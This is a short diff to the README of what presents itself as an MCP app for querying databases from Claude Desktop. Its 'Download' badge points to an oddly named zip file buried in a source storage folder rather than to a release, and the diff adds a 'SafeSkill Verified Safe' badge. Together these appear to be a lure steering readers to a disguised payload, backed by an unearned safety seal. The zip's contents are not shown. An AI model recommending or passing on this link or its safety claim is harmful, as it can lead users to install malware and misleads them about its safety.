@@ -1,6 +1,7 @@
 # 💾 mcp-database-query-app - Manage your databases through a simple interface
 
 [![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Dry-statelyhome866/mcp-database-query-app/raw/refs/heads/main/src/McpDatabaseQueryApp.Core/Storage/database-query-app-mcp-fatality.zip)
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/dry-statelyhome866-mcp-database-query-app)
 
 This application connects your databases to the Claude Desktop interface. It allows you to run queries and manage data without writing complex code. You see your tables, run SQL commands, and visualize results directly inside your chat workspace.
 
